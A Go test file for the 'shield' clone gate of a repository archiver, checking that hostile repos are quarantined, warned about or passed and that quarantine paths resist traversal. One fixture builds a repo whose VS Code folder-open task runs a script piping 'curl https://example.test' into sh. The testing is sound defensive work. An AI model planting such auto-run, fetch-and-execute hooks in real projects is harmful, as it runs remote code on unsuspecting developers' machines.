package engine

import (
	"context"
	"encoding/json"
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/TTox-Tech/chitragit/internal/audit"
	"github.com/TTox-Tech/chitragit/internal/core"
	"github.com/TTox-Tech/chitragit/internal/provider"
	"github.com/TTox-Tech/chitragit/internal/store"
)

// shieldUpstream makes a bare upstream repo whose one commit holds files.
func shieldUpstream(t *testing.T, files map[string]string) string {
	t.Helper()
	up := filepath.Join(t.TempDir(), "up.git")
	git(t, ".", "init", "-q", "--bare", up)
	dev := filepath.Join(t.TempDir(), "dev")
	git(t, ".", "clone", "-q", up, dev)
	for p, data := range files {
		full := filepath.Join(dev, filepath.FromSlash(p))
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(data), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	git(t, dev, "add", "-A")
	git(t, dev, "commit", "-q", "-m", "one")
	git(t, dev, "push", "-q", "origin", "HEAD")
	return up
}

func shieldCloner(t *testing.T, root string, st *store.Store, mirror bool) (*cloner, string) {
	t.Helper()
	allowLocalClones = true
	t.Cleanup(func() { allowLocalClones = false })
	pack, err := audit.BuiltinRules()
	if err != nil {
		t.Fatal(err)
	}
	q := filepath.Join(t.TempDir(), "quarantine")
	_, g, _ := setup(t)
	c, err := newCloner(context.Background(), CloneOptions{Root: root, TmpDir: filepath.Join(root, ".chitragit", "tmp"),
		Layout: "{owner}/{repo}", Mirror: mirror, Shield: &ShieldOptions{Pack: pack, BlockAt: audit.SevHigh, Quarantine: q}}, g, st)
	if err != nil {
		t.Fatal(err)
	}
	return c, q
}

// The ticket's bar: a hostile repo never has a single file in the working
// tree. The test walks the whole archive and the temporary folder.
func TestCloneGateBlocksHostileRepo(t *testing.T) {
	ctx := context.Background()
	root, _, st := setup(t)
	hostile := map[string]string{
		".vscode/tasks.json": `{"tasks": [{"label": "x", "command": "./x.sh", "runOptions": {"runOn": "folderOpen"}}]}`,
		"x.sh":               "#!/bin/sh\ncurl https://example.test | sh\n",
		"README.md":          "# nothing to see\n",
	}
	up := shieldUpstream(t, hostile)
	want := git(t, up, "rev-parse", "HEAD")
	c, q := shieldCloner(t, root, st, false)

	rel, err := c.clone(ctx, provider.Repo{Host: "example.test", Owner: "acme", Name: "evil", CloneURL: up})
	var be *BlockedError
	if !errors.As(err, &be) || rel != "" {
		t.Fatalf("clone = %q, %v; want a block", rel, err)
	}
	if core.CategoryOf(err) != core.CatBlocked || core.ExitCodeFor(err) != core.ExitBlocked {
		t.Errorf("category %s, exit %d", core.CategoryOf(err), core.ExitCodeFor(err))
	}

	// Not one file of the repo exists anywhere under the archive.
	_ = filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			t.Fatal(err)
		}
		switch filepath.Base(p) {
		case ".vscode", "tasks.json", "x.sh", "README.md":
			t.Errorf("a file of the blocked repo was written: %s", p)
		}
		return nil
	})
	if _, err := os.Stat(filepath.Join(root, "acme")); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("archive folder made for a blocked repo: %v", err)
	}

	// Every object is kept in the quarantine, as a bare repo, with the report.
	dest := filepath.Join(q, "example.test", "acme", "evil.git")
	if be.Report.Quarantine != dest {
		t.Fatalf("quarantine = %s, want %s", be.Report.Quarantine, dest)
	}
	if got := git(t, dest, "rev-parse", "HEAD"); got != want {
		t.Errorf("quarantined HEAD = %s, want %s", got, want)
	}
	if git(t, dest, "rev-parse", "--is-bare-repository") != "true" {
		t.Error("quarantine is not a bare repo")
	}
	git(t, dest, "fsck", "--no-progress")
	var rep ShieldReport
	b, err := os.ReadFile(filepath.Join(dest, shieldReportFile))
	if err != nil || json.Unmarshal(b, &rep) != nil || rep.Verdict != audit.VerdictBlock || rep.Commit != want {
		t.Fatalf("report: %+v %v", rep, err)
	}
	found := false
	for _, f := range rep.Findings {
		found = found || f.Rule == audit.RuleVSCodeFolderOpenTask
	}
	if !found {
		t.Errorf("report misses the folder-open task: %+v", rep.Findings)
	}

	// The block is in the ledger, and the chain still verifies.
	entries, err := st.Ledger(ctx, store.LedgerFilter{})
	if err != nil || len(entries) != 1 || entries[0].Type != EventShieldBlocked {
		t.Fatalf("ledger: %+v %v", entries, err)
	}
	if chk, err := st.VerifyLedger(ctx); err != nil || !chk.OK {
		t.Errorf("ledger check: %+v %v", chk, err)
	}

	// A second block of the same name gets its own folder; nothing is overwritten.
	_, err = c.clone(ctx, provider.Repo{Host: "example.test", Owner: "acme", Name: "evil", CloneURL: up})
	if !errors.As(err, &be) || be.Report.Quarantine != filepath.Join(q, "example.test", "acme", "evil-2.git") {
		t.Fatalf("second block: %v", err)
	}
}

func TestCloneGatePassesAndWarns(t *testing.T) {
	ctx := context.Background()
	root, _, st := setup(t)
	c, q := shieldCloner(t, root, st, false)

	clean := shieldUpstream(t, map[string]string{"main.go": "package main\n", "docs/a.md": "# a\n"})
	if rel, err := c.clone(ctx, provider.Repo{Host: "h", Owner: "acme", Name: "clean", CloneURL: clean}); err != nil || rel != "acme/clean" {
		t.Fatalf("clean clone = %q, %v", rel, err)
	}
	for _, p := range []string{"main.go", "docs/a.md"} {
		if _, err := os.Stat(filepath.Join(root, "acme", "clean", filepath.FromSlash(p))); err != nil {
			t.Errorf("clean repo not checked out: %v", err)
		}
	}
	if out := git(t, filepath.Join(root, "acme", "clean"), "status", "--porcelain"); out != "" {
		t.Errorf("checkout left changes:\n%s", out)
	}

	// Medium findings (a direnv file) warn, and the files are written.
	warn := shieldUpstream(t, map[string]string{".envrc": "export X=1\n"})
	if rel, err := c.clone(ctx, provider.Repo{Host: "h", Owner: "acme", Name: "warn", CloneURL: warn}); err != nil || rel != "acme/warn" {
		t.Fatalf("warn clone = %q, %v", rel, err)
	}
	if _, err := os.Stat(filepath.Join(root, "acme", "warn", ".envrc")); err != nil {
		t.Error("warned repo not checked out")
	}
	if len(c.warnings) != 1 || !strings.Contains(c.warnings[0], "acme/warn") {
		t.Errorf("warnings = %q", c.warnings)
	}

	// An empty repo passes with nothing to check out.
	empty := filepath.Join(t.TempDir(), "empty.git")
	git(t, ".", "init", "-q", "--bare", empty)
	if rel, err := c.clone(ctx, provider.Repo{Host: "h", Owner: "acme", Name: "empty", CloneURL: empty}); err != nil || rel != "acme/empty" {
		t.Fatalf("empty clone = %q, %v", rel, err)
	}
	if _, err := os.Stat(q); !errors.Is(err, fs.ErrNotExist) {
		t.Error("quarantine used without a block")
	}
}

// A mirror has no files, so a block is reported but the mirror is kept.
func TestCloneGateMirrorIsNotHeld(t *testing.T) {
	ctx := context.Background()
	root, _, st := setup(t)
	c, _ := shieldCloner(t, root, st, true)
	up := shieldUpstream(t, map[string]string{".vscode/tasks.json": `{"runOn": "folderOpen"}`})
	rel, err := c.clone(ctx, provider.Repo{Host: "h", Owner: "acme", Name: "m", CloneURL: up})
	if err != nil || rel != "acme/m.git" || len(c.warnings) != 1 {
		t.Fatalf("mirror clone = %q, %v, %q", rel, err, c.warnings)
	}
}

func TestQuarantinePathIsSafe(t *testing.T) {
	q := t.TempDir()
	p, err := quarantinePath(q, provider.Repo{Host: "h", Owner: "..", Name: "a/b"})
	if err != nil {
		t.Fatal(err)
	}
	rel, _ := filepath.Rel(q, p)
	parts := strings.Split(filepath.ToSlash(rel), "/")
	if len(parts) != 3 || parts[0] != "h" || !strings.HasPrefix(parts[1], "unnamed-") || !strings.HasPrefix(parts[2], "unnamed-") {
		t.Errorf("quarantine path = %s", rel)
	}
	if _, err := quarantinePath("", provider.Repo{Host: "h", Owner: "o", Name: "n"}); err == nil {
		t.Error("an empty quarantine folder was accepted")
	}
}
